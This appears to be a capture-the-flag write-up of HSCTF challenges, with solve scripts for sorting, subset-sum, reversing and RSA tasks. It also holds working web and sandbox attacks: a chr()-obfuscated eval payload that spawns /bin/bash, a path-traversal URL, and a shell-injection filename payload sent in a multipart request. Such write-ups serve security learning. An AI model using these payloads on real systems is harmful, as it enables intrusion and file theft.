# algorithms
## travelling-salesman
In this algorithms, we need to sorting the output.
i use python program as below to sort the output:
```python
import pwn

n = pwn.remote('travelling-salesman.hsctf.com', 1337)

print(n.recv(4096).decode())
q = n.recv(4096).decode()

print(q)

while True:
    q = q.replace('order:',"")
    q = q.replace('[',"")
    q = q.replace(']',"")
    q = q.replace('\n',"")
    q = q.replace(' ',"")

    q = q.split(',')
    q = sorted(q)
    q = ' '.join(q)
    
    print(q)

    n.sendline(q)
    
    q = n.recv(4096).decode()
    print(q)
```
somehow, we need to run this program several times for the flag to be displayed

## vending-machine
After some time surfing the internet, I found an interesting algorithm that can solve this problem in:
https://stackoverflow.com/questions/4632322/finding-all-possible-combinations-of-numbers-to-reach-a-given-sum

after that I wrote a python script to parse the output:
```python
def parseItems(Items):
    Items = Items.split('\n')
    Items = [x.split(': ') for x in Items]
    return Items
def parseCoins(Coins):
    Coins = Coins.split('\n')
    Coins = [x.split(': ') for x in Coins]
    return Coins
def parseItemsCoins(p):
    Items, Coins = p.split('\n\nCoins: \n')
    Items = Items.replace("Items: \n", "")
    Items = parseItems(Items)
    Coins = parseCoins(Coins)
    return Items, Coins
def subset_sum(numbers, target, partial=[]):
    s = sum(partial)

    # check if the partial sum is equals to target
    if s > target and s < target+400: # we can change this parameter, to filter the output
        print("sum(%s)=%s" % (partial, s))
    if s >= target:
        return  # if we reach the number why bother to continue
    
    for i in range(len(numbers)):
        n = numbers[i]
        remaining = numbers[i+1:]
        subset_sum(remaining, target, partial + [n]) 

def coinsSubset(Coins, target:int):
    Coins = [int(x[1]) for x in Coins]
    return subset_sum(Coins, target)


p = """Items: 
4: 39668
5: 30932

Coins: 
5: 5500
6: 9589
9: 8857
10: 17249
12: 11088
13: 7793
15: 6513
17: 6562""" #the output goes here
Items, Coins = parseItemsCoins(p)
print(Items)
print(Coins)
coinsSubset(Coins, int(Items[0][1]))
```
I entered the input manually and used the program above to determine the best option for Insert coins.
# miscellaneous
## paas
After some trial and error, I found that `'".` is restricted to use, because of that
 I tried to use eval, and entered the malicious code via deobfuscation with chr().
I use the following code:
```python
import pwn

# import os and pop bash
e = "__import__('os').system('/bin/bash')"

# strings to decimals
n = [ord(c) for c in e]

for i in range(len(n)):
    n[i] = "chr(%s)" % n[i]

n = '+'.join(n)
n = f'eval({n})'

c = pwn.remote('paas.hsctf.com', 1337)
c.sendline(n)
c.interactive()
```

## gallery
we can pass a parameter {{ image }} in index.html
```html
		<main class="image-grid">
			{% for image in images %}
			<div class="item"><img src="/image?image={{ image }}" /></div>
			{% endfor %}
		</main>
```
use file inclusion and bypass this:
```python
	if "image" not in request.args:
		return "Image not provided", 400
	if ".jpg" not in request.args["image"]:
		return "Invalid filename", 400
```
and we get this parameter that show the flag.txt
http://web1.hsctf.com:8003/image?image=.jpg/../../../../flag.txt
# Web
## png-wizard
After observing the program code, I noticed that it wasn't sanitized properly in main.py in this section:
```python
...snip...
		subprocess.run(
			f"convert '{filename}' '{new_name}'",
...snip...
```
So we can input the parameters there.

The function below will return an error when there is an incorrect bash code. We can use this to pipe **stdout** to **stderr** so we can read the bash output that we input.
```python
...snip...
	except subprocess.CalledProcessError as e:
		return render_template(
			"index.html",
			error=f"Error converting file: {e.stderr.decode('utf-8',errors='ignore')}"
		)
...snip...
```

```python
def is_valid_extension(filename: Path):
	return (
		filename.suffix.lower().lstrip(".")
		in ("gif", "jpg", "jpeg", "png", "tiff", "tif", "ico", "bmp", "ppm")
	)
```
We also need to bypass this extension, by adding `.jpg`, `.gif`, etc after the filename.

After trial and error, we finally get the following payload:
```
';cat flag.txt 1>&2 ;wtf #.jpg
```
where `wtf` is a fictional command that I use to trigger the error, so that the previous command can be seen in the error.

I opened burpsuite, and sent a http request something like this:
```
...snip...
------WebKitFormBoundarytlzYSfmGob8mETRZ
Content-Disposition: form-data; name="file"; filename="';cat flag.txt 1>&2 ;wtf #.jpg"
Content-Type: image/jpeg

test
------WebKitFormBoundarytlzYSfmGob8mETRZ
...snip...
```

## squeal
I just copy one by one the sql injection in this articel and got the flag:
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

# reversing
## adding
```python
def solve(a = 213):
    x = 0
    y = 0
    for i in range(0,a+1):
        x = x * 2 + 2
        y += x * 20
        y += i * 10 + 10
    return y
print("flag{" + str(solve()) + "}")
```
## acts-nightmare
sorry ga lengkap soalnya ada yang manual 
```java
import java.util.*;

class Main {

    public static String stackAttack(String in) {
        Stack<Character> s = new Stack<>();
        for (char c: in.toCharArray())
            s.push(c);
        String res = "";
        int i = 3;
        while (!s.isEmpty()) {
            res += (char)(s.pop() + i);
            if (i == 0){
        i += 4;
      }
      i = (i - 1);
        }
        return res;
    }

    public static String recurses(String in, String out, int i) {
        if (in.isEmpty())
            return out;
        String res = out;
        if (i == 0)
            res += in.charAt(i);
        else
            res = in.charAt(i) + res;
        if (i == 0)
            return recurses(in.substring(1), res, 1);
        return recurses(in.charAt(0) + in.substring(2), res, 0);
    }

    public static String linkDemLists(String in) {
        LinkedList<Character> lin = new LinkedList<>();
        for (char x: in.toCharArray())
            lin.add(x);
        String res = "";
        ListIterator<Character> iter = lin.listIterator(in.length()/2);
        while (iter.hasNext())
            res += iter.next();
        iter = lin.listIterator(in.length()/2);
        while (iter.hasPrevious())
            res += iter.previous();
        return res;
    }

    public static void main(String[] args) {
    System.out.println(stackAttack("2604_2ak1bq\\t2i`0q]qn4/\\50fq"));
    }
}
```
# cryptography
## baby-baby-rsa
```python
#!/bin/python3
from itertools import product
from Crypto.Util.number import long_to_bytes, inverse

c = 54794426723900547461854843163768660308115034417111329528183606035659639395104723918632912086419836023341428265596988959206660015436864401403237748771765948022232575597127381504670391300908215025163138869313954305720403722718214862988965792884236612959443476803344992121865817757791519151566895512058656532409472494022672998848036223706004788146906885182892250477746430460414866512005225936680732094537985671236900243908114730784290372829952741399684135984046796
e = 0x10001
pq_bit_shuffle = ['0100101100001100010110110001000001001110010110110011101111100001101100000101000011111000101110011010010100101100011111000000101010011101100101010000101101110100100010101011100110001010001000000001000110000111011110011001101111110000100010000110000001110011', '1100001100001100111110011110110101001100100000000100000100011110110010010101000011111111000100001000111001100110010010010011110110110010010110110100010110100011011100101001100001010111000100000110101010101011011110110110101010110100011110010000101010000111', '1000100010110110010100111010100100111000100111100101100001011111100011000111110011101011011011100000101011000111010110010010011110100100110000001101110111001000000111100111011011000101010001111101000111100111110010011101011111100100111111011011110110101111', '1111001101111101111111111111001010001111100010100000010110011011100000000110010110000011011110101110001000001111110101101101111000000111101111111000011101011010000110111100000110000001001101101010100000010011000100010111100001011000101101111000101101110100', '1100100000100001010111110010000011000010100110101111100100011010111111110100011011111100001011101001010000100111100011100111000101110001001011110000000000000000000110111100000111100000111111010110010011000010011000110111001010000110011011111101011110000101', '0001101000011011010011100100000011010101110110111001111011000001010101101111110100011011010011111010001111011011100011111110101110101101111100100011111110011111010100001100011000111011010111110101000011110101011110110001011110001111011001101100110100000101']

# permutation
for i,j,k,l,m,n in product(pq_bit_shuffle,repeat=6):
    p1,p2,p3 = i,j,k
    q1,q2,q3 = l,m,n
    p = int(p1+p2+p3,2)
    q = int(q1+q2+q3,2)
    if p.bit_length() and q.bit_length() == 768:
        tot = (p-1)*(q-1)
        n = p*q
        d = inverse(e, tot)
        m = long_to_bytes(pow(c,d,n))
        if b'flag' in m:
            print(m)
```
